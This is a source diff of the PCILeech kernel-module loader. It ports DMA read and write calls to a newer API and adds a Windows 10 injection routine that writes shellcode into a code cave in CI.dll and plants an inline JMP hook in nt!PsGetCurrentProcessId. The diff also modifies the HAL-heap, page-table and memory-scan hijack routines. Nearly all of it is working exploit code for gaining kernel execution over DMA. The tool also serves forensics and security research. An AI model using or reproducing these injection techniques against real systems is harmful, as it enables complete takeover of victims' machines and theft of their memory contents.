+    VMMDLL_MemWrite(4, vaHalBugCheckSystem, pbHalBugCheckSystem_Orig, 16);
     ZeroMemory(pbPage, 0x1000);
-    VmmPrx_MemWrite(4, vaData, pbPage, 0x800);
+    VMMDLL_MemWrite(4, vaData, pbPage, 0x800);
     //------------------------------------------------
     // 7: Set up reference to KMD.
     //------------------------------------------------
@@ -936,7 +933,7 @@ success_kmd_load:
     ctxMain->phKMD->pk = (PKMDDATA)ctxMain->phKMD->pbPageData;
     ctxMain->pk = ctxMain->phKMD->pk;
     ctxMain->phKMD->dwPageAddr32 = (DWORD)paKMD;
-    LeechCore_Read(ctxMain->phKMD->dwPageAddr32, ctxMain->phKMD->pbPageData, 4096);
+    LcRead(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData);
     //------------------------------------------------
     // 8: Retrieve physical memory range map and complete open action.
     //------------------------------------------------
@@ -949,22 +946,175 @@ success_kmd_load:
     ctxMain->cfg.qwKMD = ctxMain->phKMD->dwPageAddr32;
     if(ctxMain->pk->MAGIC != KMDDATA_MAGIC) {
         ctxMain->pk->MAGIC = KMDDATA_MAGIC;
-        LeechCore_Write(ctxMain->phKMD->dwPageAddr32, ctxMain->phKMD->pbPageData, sizeof(QWORD));
+        LcWrite(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, sizeof(QWORD), ctxMain->phKMD->pbPageData);
     }
     result = TRUE;
 fail:
     LocalFree(pSections);
     LocalFree(pMemMap);
-    VmmPrx_Close();
+    Vmmx_Close();
     return result;
 }
+
+/*
+* Load a kernel module (KMD) into a Windows 10 system on which not both of
+* Vt-d and Virtualization Based Security is enabled. This technique relies
+* on analysis by MemProcFS (vmm.dll) which currently only is a Windows module.
+* as a result the initial attack may currently only take place from Windows
+* attackers.
+* The technique puts the executable shellcode inside a code cave inside CI.dll.
+* Initial code execution is gained by placing an inline hook in nt!PsGetCurrentProcessId
+*/
+_Success_(return)
+BOOL KMDOpen_WINX64_3_VMM()
+{
+    BOOL f, fResult = FALSE;
+    QWORD vaHook, vaCI, vaDataPre = 0, vaExec = 0;
+    DWORD i, cSections, dwHookJMP, paKMD = 0, cbShellcode = 0;
+    BYTE pbShellcode[0xc00], pbShellcodeVerify[0xc00], pbHookOriginalData[0x14], pbHook[13] = { 0 }, pbZero20[0x20] = { 0 };
+    PIMAGE_SECTION_HEADER pSections = NULL;
+    // ------------------------------------------------------------------------
+    // 1: Initialize MemProcFS/vmm.dll
+    // ------------------------------------------------------------------------
+    if(!Vmmx_Initialize(FALSE, FALSE)) {
+        printf("KMD: Failed initializing required MemProcFS/vmm.dll #1\n");
+        return FALSE;
+    }
+    // ------------------------------------------------------------------------
+    // 2: Load Signature.
+    // ------------------------------------------------------------------------
+    if(!Util_ParseHexFileBuiltin("DEFAULT_WINX64_STAGE23_VMM3", pbShellcode, sizeof(pbShellcode), &cbShellcode)) { goto fail; }
+    // ------------------------------------------------------------------------
+    // 3: Locate locations where to insert
+    //    code: (CI.dll 'INIT'  section)
+    //    data: (CI.dll '.data' section)
+    //    hook: (nt!PsGetCurrentProcessId)
+    // ------------------------------------------------------------------------
+    f = (vaCI = VMMDLL_ProcessGetModuleBase(4, L"CI.dll")) &&
+        VMMDLL_ProcessGetSections(4, L"CI.dll", NULL, 0, &cSections) &&
+        cSections &&
+        (pSections = LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER))) &&
+        VMMDLL_ProcessGetSections(4, L"CI.dll", pSections, cSections, &cSections);
+    for(i = 0; f && (i < cSections); i++) {
+        if(!strcmp("INIT", pSections[i].Name)) {
+            vaExec = vaCI + pSections[i].VirtualAddress + 0x400;
+        }
+        if(!strcmp(".data", pSections[i].Name)) {
+            vaDataPre = ((vaCI + pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize + 0xfff) & ~0xfff) - 0x20;
+        }
+    }
+    if(!f || !vaExec || !vaDataPre) {
+        printf("KMD: Failed get code cave (CI.dll) #2\n");
+        goto fail;
+    }
+    f = (vaHook = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "PsGetCurrentProcessId")) &&
+        VMMDLL_MemRead(4, vaHook, pbHookOriginalData, sizeof(pbHookOriginalData));
+    if(!f) {
+        printf("KMD: Failed get hook (ntoskrnl.exe) #3\n");
+        goto fail;
+    }
+    if((pbHookOriginalData[0x00] == 0xE9)) {
+        printf("KMD: Hook already inserted #4\n");
+        goto fail_hookrestore;
+    }
+    // ------------------------------------------------------------------------
+    // 4: Prepare and Inject!
+    // ------------------------------------------------------------------------
+    f = (*(PQWORD)(pbShellcode + 0x020) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "KeGetCurrentIrql")) &&
+        (*(PQWORD)(pbShellcode + 0x028) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "PsCreateSystemThread")) &&
+        (*(PQWORD)(pbShellcode + 0x030) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "ZwClose")) &&
+        (*(PQWORD)(pbShellcode + 0x038) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmAllocateContiguousMemory")) &&
+        (*(PQWORD)(pbShellcode + 0x040) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmGetPhysicalAddress")) &&
+        (*(PQWORD)(pbShellcode + 0x048) = VMMDLL_ProcessGetModuleBase(4, L"ntoskrnl.exe"));
+    if(!f) {
+        printf("KMD: Failed get functions (ntoskrnl.exe) #5\n");
+        goto fail;
+    }
+    *(PQWORD)(pbShellcode + 0x018) = vaDataPre;
+    memcpy(pbShellcode + 0x004, pbHookOriginalData, sizeof(pbHookOriginalData));
+    if(!VMMDLL_MemWrite(4, vaExec, pbShellcode, cbShellcode) || !VMMDLL_MemRead(4, vaExec, pbShellcodeVerify, cbShellcode) || memcmp(pbShellcode, pbShellcodeVerify, cbShellcode)) {
+        printf("KMD: Failed MemWrite (CI.dll) #6\n");
+        goto fail;
+    }
+    if((vaHook - vaExec > 0x7fff0000) && (vaExec - vaHook > 0x7fff0000)) {
+        // ABSOLUTE JMP [MOV r10, addr + JMP r10]
+        pbHook[0] = 0x49;
+        pbHook[1] = 0xBA;
+        *(PQWORD)(pbHook + 2) = vaExec;
+        pbHook[10] = 0x41;
+        pbHook[11] = 0xFF;
+        pbHook[12] = 0xE2;
+    } else {
+        // RELATIVE JMP
+        pbHook[0] = 0xE9;   // JMP
+        *(PDWORD)(pbHook + 1) = (dwHookJMP = (DWORD)(vaExec - (vaHook + 5ULL)));
+    }
+    if(!VMMDLL_MemWrite(4, vaHook, pbHook, sizeof(pbHook))) {
+        printf("KMD: Failed MemWrite (ntoskrnl.exe) #7\n");
+        goto fail;
+    }
+    // ------------------------------------------------------------------------
+    // 5: Wait for execution.
+    // ------------------------------------------------------------------------
+    printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
+    do {
+        Sleep(100);
+        if(!VMMDLL_MemReadEx(4, vaDataPre + 0x1c, (PBYTE)&paKMD, sizeof(DWORD), NULL, VMMDLL_FLAG_NOCACHE)) {
+            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
+            goto fail_hookrestore;
+        }
+    } while(paKMD == 0);
+    printf("KMD: Execution received - continuing ...\n");
+    //------------------------------------------------
+    // 6: Set up reference to KMD.
+    //------------------------------------------------
+    if(ctxMain->cfg.fVerbose) {
+        printf("INFO: PA KMD BASE:  0x%08x\n", (DWORD)paKMD);
+    }
+    ctxMain->phKMD = (PKMDHANDLE)LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE));
+    if(!ctxMain->phKMD) { goto fail; }
+    ctxMain->phKMD->pk = (PKMDDATA)ctxMain->phKMD->pbPageData;
+    ctxMain->pk = ctxMain->phKMD->pk;
+    ctxMain->phKMD->dwPageAddr32 = (DWORD)paKMD;
+    LcRead(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData);
+    //------------------------------------------------
+    // 7: Retrieve physical memory range map and complete open action.
+    //------------------------------------------------
+    if(!KMD_GetPhysicalMemoryMap()) {
+        printf("KMD: Failed. Failed to retrieve physical memory map.\n");
+        printf("             KMD _may_ still be located at: 0x%08x\n", (DWORD)paKMD);
+        KMDClose();
+        goto fail_hookrestore;
+    }
+    ctxMain->cfg.qwKMD = ctxMain->phKMD->dwPageAddr32;
+    if(ctxMain->pk->MAGIC != KMDDATA_MAGIC) {
+        ctxMain->pk->MAGIC = KMDDATA_MAGIC;
+        LcWrite(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, sizeof(QWORD), ctxMain->phKMD->pbPageData);
+    }
+    fResult = TRUE;
+fail_hookrestore:
+    VMMDLL_MemWrite(4, vaHook, pbHookOriginalData, sizeof(pbHookOriginalData));
+    VMMDLL_MemWrite(4, vaDataPre, pbZero20, sizeof(pbZero20));
+fail:
+    LocalFree(pSections);
+    Vmmx_Close();
+    return fResult;
+}
+
 #endif /* WIN32 */
 #ifdef LINUX
-BOOL KMDOpen_WINX64_VMM()
+
+BOOL KMDOpen_WINX64_2_VMM()
 {
     printf("KMD: Failed. Not supported on Linux.\n");
     return FALSE;
 }
+BOOL KMDOpen_WINX64_3_VMM()
+{
+    printf("KMD: Failed. Not supported on Linux.\n");
+    return FALSE;
+}
+
 #endif /* LINUX */
 
 // https://blog.coresecurity.com/2016/08/25/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-3-windows-hals-heap/
@@ -985,7 +1135,7 @@ BOOL KMDOpen_HalHijack()
     // 1: Fetch hal.dll heap and perform sanity checks.
     //------------------------------------------------
     Util_CreateSignatureWindowsHalGeneric(&oSignature);
-    result = 0x1000 == LeechCore_ReadEx(ADDR_HAL_HEAP_PA, pbHal, 0x1000, LEECHCORE_FLAG_READ_RETRY, NULL);
+    result = DeviceReadDMA_Retry(ctxMain->hLC, ADDR_HAL_HEAP_PA, 0x1000, pbHal);
     qwPML4 = *(PQWORD)(pbHal + 0xa0);
     qwHalVA = *(PQWORD)(pbHal + 0x78);
     if(!result || (qwPML4 & 0xffffffff00000fff)) {
@@ -1004,11 +1154,12 @@ BOOL KMDOpen_HalHijack()
     //------------------------------------------------
     // 2: Search for function table in hal.dll heap.
     //------------------------------------------------
+    result = FALSE;
     for(qwAddrHalHeapVA = (qwHalVA & 0xffffffffffd00000); qwAddrHalHeapVA < (qwHalVA & 0xffffffffffd00000) + 0x100000; qwAddrHalHeapVA += 0x1000) {
         result =
             Util_PageTable_ReadPTE(qwPML4, qwAddrHalHeapVA, &qwPTEOrig, &qwPTEPA) &&
             ((qwPTEOrig & 0x00007fff00000003) == 0x00000003) &&
-            (0x1000 == LeechCore_ReadEx((qwPTEOrig & 0xfffff000), pbHal, 0x1000, LEECHCORE_FLAG_READ_RETRY, NULL)) &&
+            DeviceReadDMA_Retry(ctxMain->hLC, (qwPTEOrig & 0xfffff000), 0x1000, pbHal) &&
             KMD_Win_SearchTableHalpApicRequestInterrupt(pbHal, qwAddrHalHeapVA, &dwHookFnPgOffset);
         if(result) {
             break;
@@ -1019,7 +1170,7 @@ BOOL KMDOpen_HalHijack()
         return FALSE;
     }
     qwPTPA = qwPTEPA & ~0xfff;
-    result = 0x1000 == LeechCore_ReadEx((DWORD)qwPTPA, pbPT, 0x1000, LEECHCORE_FLAG_READ_RETRY, NULL);
+    result = DeviceReadDMA_Retry(ctxMain->hLC, (DWORD)qwPTPA, 0x1000, pbPT);
     if(!result || memcmp(pbPT + 0x200, pbNULL, 0x300)) { // 0x300 bytes between 0x200:0x500 in Hal PT must be zero
         printf("KMD: Failed. Error reading or interpreting PT.\n");
         return FALSE;
@@ -1032,13 +1183,13 @@ BOOL KMDOpen_HalHijack()
     memcpy(pbPT + 0x210, oSignature.chunk[3].pb, oSignature.chunk[3].cb);
     *(PQWORD)(pbPT + 0x210 + STAGE2_OFFSET_FN_STAGE1_ORIG) = *(PQWORD)(pbHal + dwHookFnPgOffset);
     *(PQWORD)(pbPT + 0x210 + STAGE2_OFFSET_EXTRADATA1) = qwAddrHalHeapVA + dwHookFnPgOffset;
-    LeechCore_WriteEx(qwPTPA + 0x200, pbPT + 0x200, 0x300, PCILEECH_MEM_FLAG_RETRYONFAIL);
+    DeviceWriteDMA_Retry(ctxMain->hLC, qwPTPA + 0x200, 0x300, pbPT + 0x200);
     Util_PageTable_SetMode(qwPML4, qwShellcodeVA, TRUE);
     //------------------------------------------------
     // 4: Place hook by overwriting function addr in hal.dll heap.
     //------------------------------------------------
     Sleep(250);
-    LeechCore_WriteEx((qwPTEOrig & 0xfffff000) + dwHookFnPgOffset, (PBYTE)&qwShellcodeVA, sizeof(QWORD), PCILEECH_MEM_FLAG_RETRYONFAIL);
+    DeviceWriteDMA_Retry(ctxMain->hLC, (qwPTEOrig & 0xfffff000) + dwHookFnPgOffset, sizeof(QWORD), (PBYTE)&qwShellcodeVA);
     if(ctxMain->cfg.fVerbose) {
         printf("INFO: PA PT BASE:   0x%016llx\n", qwPML4);
         printf("INFO: PA PT:        0x%016llx\n", qwPTPA);
@@ -1052,7 +1203,7 @@ BOOL KMDOpen_HalHijack()
     pdwPhysicalAddress = (PDWORD)(pbPT + 0x210 + STAGE2_OFFSET_STAGE3_PHYSADDR);
     do {
         Sleep(100);
-        if(4096 != LeechCore_ReadEx((DWORD)qwPTPA, pbPT, 4096, LEECHCORE_FLAG_READ_RETRY, NULL)) {
+        if(!DeviceReadDMA_Retry(ctxMain->hLC, (DWORD)qwPTPA, 4096, pbPT)) {
             printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
             return FALSE;
         }
@@ -1062,7 +1213,7 @@ BOOL KMDOpen_HalHijack()
     // 6: Restore hooks to original.
     //------------------------------------------------
     Sleep(250);
-    LeechCore_Write(qwPTPA + 0x200, pbNULL, 0x300);
+    LcWrite(ctxMain->hLC, qwPTPA + 0x200, 0x300, pbNULL);
     //------------------------------------------------
     // 7: Set up kernel module shellcode (stage3) and finish.
     //------------------------------------------------
@@ -1093,12 +1244,12 @@ BOOL KMD_SubmitCommand(_In_ QWORD op)
     DWORD cFailCount;
     HANDLE hCallback = NULL;
     ctxMain->pk->_op = op;
-    if(!LeechCore_Write(ctxMain->phKMD->dwPageAddr32, ctxMain->phKMD->pbPageData, 4096)) {
+    if(!LcWrite(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData)) {
         return FALSE;
     }
     do {
         cFailCount = 0;
-        while(4096 != LeechCore_ReadEx(ctxMain->phKMD->dwPageAddr32, ctxMain->phKMD->pbPageData, 4096, LEECHCORE_FLAG_READ_RETRY, NULL)) {
+        while(!DeviceReadDMA_Retry(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData)) {
             cFailCount++;
             if(cFailCount < 10) { usleep(250); continue; }
             if(cFailCount < 20) { SwitchToThread(); continue; }
@@ -1108,7 +1259,7 @@ BOOL KMD_SubmitCommand(_In_ QWORD op)
         }
         if((op != KMD_CMD_TERMINATE) && (op != KMD_CMD_MEM_INFO) && (ctxMain->pk->MAGIC != KMDDATA_MAGIC) && (ctxMain->pk->MAGIC != KMDDATA_MAGIC_PARTIAL)) {
             printf("PCILEECH: FAIL: KMDDATA corruption! - bit errors? Address: 0x%08x. Terminating.\n", ctxMain->phKMD->dwPageAddr32);
-            LeechCore_Close();
+            LcClose(ctxMain->hLC);
             ExitProcess(0);
         }
         if(ctxMain->pk->_op == KMD_CMD_EXEC_EXTENDED) {
@@ -1143,14 +1294,14 @@ BOOL KMD_GetPhysicalMemoryMap()
     if(!ctxMain->pk->_result || !ctxMain->pk->_size) { return FALSE; }
     ctxMain->phKMD->pPhysicalMap = LocalAlloc(LMEM_ZEROINIT, (ctxMain->pk->_size + 0x1000) & 0xfffff000);
     if(!ctxMain->phKMD->pPhysicalMap) { return FALSE; }
-    DeviceReadDMAEx(ctxMain->pk->DMAAddrPhysical, (PBYTE)ctxMain->phKMD->pPhysicalMap, (DWORD)((ctxMain->pk->_size + 0x1000) & 0xfffff000), NULL, 0);
+    DeviceReadDMA(ctxMain->pk->DMAAddrPhysical, (DWORD)((ctxMain->pk->_size + 0x1000) & 0xfffff000), (PBYTE)ctxMain->phKMD->pPhysicalMap, NULL);
     ctxMain->phKMD->cPhysicalMap = ctxMain->pk->_size / sizeof(PHYSICAL_MEMORY_RANGE);
     if(ctxMain->phKMD->cPhysicalMap > 0x2000) { return FALSE; }
     // adjust max memory according to physical memory
     qwMaxMemoryAddress = ctxMain->phKMD->pPhysicalMap[ctxMain->phKMD->cPhysicalMap - 1].BaseAddress;
     qwMaxMemoryAddress += ctxMain->phKMD->pPhysicalMap[ctxMain->phKMD->cPhysicalMap - 1].NumberOfBytes;
     if(qwMaxMemoryAddress > 0x0000ffffffffffff) { return FALSE; }
-    if(ctxMain->cfg.qwAddrMax > qwMaxMemoryAddress) {
+    if((ctxMain->cfg.qwAddrMax == 0) || (ctxMain->cfg.qwAddrMax > qwMaxMemoryAddress)) {
         ctxMain->cfg.qwAddrMax = qwMaxMemoryAddress - 1;
     }
     if(ctxMain->cfg.fVerbose) {
@@ -1172,13 +1323,13 @@ BOOL KMD_SetupStage3(_In_ DWORD dwPhysicalAddress, _In_ PBYTE pbStage3, _In_ DWO
     if(ctxMain->cfg.fVerbose) {
         printf("INFO: PA KMD BASE:  0x%08x\n", dwPhysicalAddress);
     }
-    LeechCore_Write(dwPhysicalAddress + 0x1000, pbStage3, cbStage3);
+    LcWrite(ctxMain->hLC, dwPhysicalAddress + 0x1000ULL, cbStage3, pbStage3);
     ctxMain->phKMD = (PKMDHANDLE)LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE));
     if(!ctxMain->phKMD) { return FALSE; }
     ctxMain->phKMD->pk = (PKMDDATA)ctxMain->phKMD->pbPageData;
     ctxMain->pk = ctxMain->phKMD->pk;
     ctxMain->phKMD->dwPageAddr32 = dwPhysicalAddress;
-    LeechCore_Read(ctxMain->phKMD->dwPageAddr32, ctxMain->phKMD->pbPageData, 4096);
+    LcRead(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData);
     //------------------------------------------------
     // 2: Retrieve physical memory range map and complete open action.
     //------------------------------------------------
@@ -1190,7 +1341,7 @@ BOOL KMD_SetupStage3(_In_ DWORD dwPhysicalAddress, _In_ PBYTE pbStage3, _In_ DWO
     ctxMain->cfg.qwKMD = ctxMain->phKMD->dwPageAddr32;
     if(ctxMain->pk->MAGIC != KMDDATA_MAGIC) {
         ctxMain->pk->MAGIC = KMDDATA_MAGIC;
-        LeechCore_Write(ctxMain->phKMD->dwPageAddr32, ctxMain->phKMD->pbPageData, sizeof(QWORD));
+        LcWrite(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, sizeof(QWORD), ctxMain->phKMD->pbPageData);
     }
     return TRUE;
 }
@@ -1206,7 +1357,7 @@ BOOL KMDReadMemory_DMABufferSized(_In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWO
     if(!result) { return FALSE; }
     result = KMD_SubmitCommand(KMD_CMD_READ);
     if(!result) { return FALSE; }
-    return (cb == DeviceReadDMAEx(ctxMain->pk->DMAAddrPhysical, pb, cb, NULL, 0)) && ctxMain->pk->_result;
+    return (cb == DeviceReadDMA(ctxMain->pk->DMAAddrPhysical, cb, pb, NULL)) && ctxMain->pk->_result;
 }
 
 _Success_(return)
@@ -1214,7 +1365,7 @@ BOOL KMDWriteMemory_DMABufferSized(_In_ QWORD qwAddress, _In_ PBYTE pb, _In_ DWO
 {
     BOOL result;
     if(!KMD_IsRangeInPhysicalMap(ctxMain->phKMD, qwAddress, cb) && !ctxMain->cfg.fForceRW) { return FALSE; }
-    result = LeechCore_Write(ctxMain->pk->DMAAddrPhysical, pb, cb);
+    result = LcWrite(ctxMain->hLC, ctxMain->pk->DMAAddrPhysical, cb, pb);
     if(!result) { return FALSE; }
     ctxMain->pk->_size = cb;
     ctxMain->pk->_address = qwAddress;
@@ -1335,8 +1486,8 @@ BOOL KMDOpen_MemoryScan()
     h2.qwPageAddr = pSignature->chunk[1].qwAddress;
     h1.dwPageOffset = 0xfff & pSignature->chunk[2].cbOffset;
     h2.dwPageOffset = 0xfff & pSignature->chunk[3].cbOffset;
-    LeechCore_ReadEx(h1.qwPageAddr, h1.pbOrig, 4096, LEECHCORE_FLAG_READ_RETRY, NULL);
-    LeechCore_ReadEx(h2.qwPageAddr, h2.pbOrig, 4096, LEECHCORE_FLAG_READ_RETRY, NULL);
+    DeviceReadDMA_Retry(ctxMain->hLC, h1.qwPageAddr, 4096, h1.pbOrig);
+    DeviceReadDMA_Retry(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbOrig);
     memcpy(h1.pbPatch, h1.pbOrig, 4096);
     memcpy(h2.pbPatch, h2.pbOrig, 4096);
     memcpy(h1.pbPatch + h1.dwPageOffset, pSignature->chunk[2].pb, pSignature->chunk[2].cb);
@@ -1350,11 +1501,11 @@ BOOL KMDOpen_MemoryScan()
     //------------------------------------------------
     // 4: Write patched data to memory.
     //------------------------------------------------
-    if(!LeechCore_WriteEx(h2.qwPageAddr, h2.pbPatch, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL | PCILEECH_MEM_FLAG_VERIFYWRITE)) {
+    if(!DeviceWriteDMA_Verify(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbPatch)) {
         printf("KMD: Failed. Signature found but unable write #2.\n");
         goto fail;
     }
-    if(!LeechCore_Write(h1.qwPageAddr, h1.pbPatch, 4096)) { // stage1 (must be written after stage2)
+    if(!LcWrite(ctxMain->hLC, h1.qwPageAddr, 4096, h1.pbPatch)) { // stage1 (must be written after stage2)
         printf("KMD: Failed. Signature found but unable write #1.\n");
         goto fail;
     }
@@ -1365,7 +1516,7 @@ BOOL KMDOpen_MemoryScan()
     pdwPhysicalAddress = (PDWORD)(h2.pbLatest + h2.dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
     do {
         Sleep(100);
-        if(4096 != LeechCore_ReadEx(h2.qwPageAddr, h2.pbLatest, 4096, LEECHCORE_FLAG_READ_RETRY, NULL)) {
+        if(!DeviceReadDMA_Retry(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbLatest)) {
             printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
             goto fail;
         }
@@ -1374,7 +1525,7 @@ BOOL KMDOpen_MemoryScan()
     //------------------------------------------------
     // 6: Restore hooks to original.
     //------------------------------------------------
-    LeechCore_Write(h2.qwPageAddr, h2.pbOrig, 4096);
+    LcWrite(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbOrig);
     //------------------------------------------------
     // 7: Set up kernel module shellcode (stage3) and finish.
     //------------------------------------------------
@@ -1466,16 +1617,16 @@ BOOL KMDOpen_PageTableHijack()
     //------------------------------------------------
     // 4: Write patched data and PTEs to memory.
     //------------------------------------------------
-    LeechCore_Read(h1.qwPageAddr, h1.pbOrig, 4096);
-    LeechCore_Read(h2.qwPageAddr, h2.pbOrig, 4096);
-    if(!LeechCore_WriteEx(h2.qwPageAddr, h2.pbPatch, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL | PCILEECH_MEM_FLAG_VERIFYWRITE) ||
-        !LeechCore_WriteEx(h1.qwPageAddr, h1.pbPatch, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL | PCILEECH_MEM_FLAG_VERIFYWRITE)) {
+    LcRead(ctxMain->hLC, h1.qwPageAddr, 4096, h1.pbOrig);
+    LcRead(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbOrig);
+    if(!DeviceWriteDMA_Verify(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbPatch) ||
+        !DeviceWriteDMA_Verify(ctxMain->hLC, h1.qwPageAddr, 4096, h1.pbPatch)) {
         printf("KMD: Failed. Signature found but unable write.\n");
         goto fail;
     }
-    LeechCore_Write(h2.qwPTEAddrPhys, (PBYTE)&h2.qwPTE, sizeof(QWORD));
+    LcWrite(ctxMain->hLC, h2.qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&h2.qwPTE);
     Sleep(250);
-    LeechCore_Write(h1.qwPTEAddrPhys, (PBYTE)&h1.qwPTE, sizeof(QWORD));
+    LcWrite(ctxMain->hLC, h1.qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&h1.qwPTE);
     //------------------------------------------------
     // 5: wait for patch to reveive execution.
     //------------------------------------------------
@@ -1483,7 +1634,7 @@ BOOL KMDOpen_PageTableHijack()
     pdwPhysicalAddress = (PDWORD)(h2.pbLatest + h2.dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
     do {
         Sleep(100);
-        if(4096 != LeechCore_ReadEx(h2.qwPageAddr, h2.pbLatest, 4096, LEECHCORE_FLAG_READ_RETRY, NULL)) {
+        if(!DeviceReadDMA_Retry(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbLatest)) {
             printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
             goto fail;
         }
@@ -1492,11 +1643,11 @@ BOOL KMDOpen_PageTableHijack()
     //------------------------------------------------
     // 6: Restore hijacked memory pages.
     //------------------------------------------------
-    LeechCore_Write(h1.qwPTEAddrPhys, (PBYTE)&h1.qwPTEOrig, sizeof(QWORD));
-    LeechCore_Write(h2.qwPTEAddrPhys, (PBYTE)&h2.qwPTEOrig, sizeof(QWORD));
+    LcWrite(ctxMain->hLC, h1.qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&h1.qwPTEOrig);
+    LcWrite(ctxMain->hLC, h2.qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&h2.qwPTEOrig);
     Sleep(100);
-    LeechCore_Write(h1.qwPageAddr, h1.pbOrig, 4096);
-    LeechCore_Write(h2.qwPageAddr, h2.pbOrig, 4096);
+    LcWrite(ctxMain->hLC, h1.qwPageAddr, 4096, h1.pbOrig);
+    LcWrite(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbOrig);
     //------------------------------------------------
     // 7: Set up kernel module shellcode (stage3) and finish.
     //------------------------------------------------
@@ -1531,7 +1682,7 @@ BOOL KMDOpen_LoadExisting()
     if(!ctxMain->phKMD) { return FALSE; }
     ctxMain->phKMD->dwPageAddr32 = (DWORD)ctxMain->cfg.qwKMD;
     ctxMain->pk = ctxMain->phKMD->pk = (PKMDDATA)ctxMain->phKMD->pbPageData;
-    if(4096 != LeechCore_ReadEx(ctxMain->phKMD->dwPageAddr32, ctxMain->phKMD->pbPageData, 4096, LEECHCORE_FLAG_READ_RETRY, NULL)) {
+    if(!DeviceReadDMA_Retry(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData)) {
         printf("KMD: Failed. Read failed @ address: 0x%08x\n", ctxMain->phKMD->dwPageAddr32);
         goto fail;
     }
@@ -1565,7 +1716,9 @@ BOOL KMDOpen()
     } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "WIN10_X64")) {
         return KMDOpen_HalHijack();
     } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "WIN10_X64_2")) {
-        return KMDOpen_WINX64_VMM();
+        return KMDOpen_WINX64_2_VMM();
+    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "WIN10_X64_3")) {
+        return KMDOpen_WINX64_3_VMM();
     } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "LINUX_X64_EFI")) {
         return KMDOpen_LinuxEfiRuntimeServicesHijack();
     } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "UEFI_EXIT_BOOT_SERVICES")) {
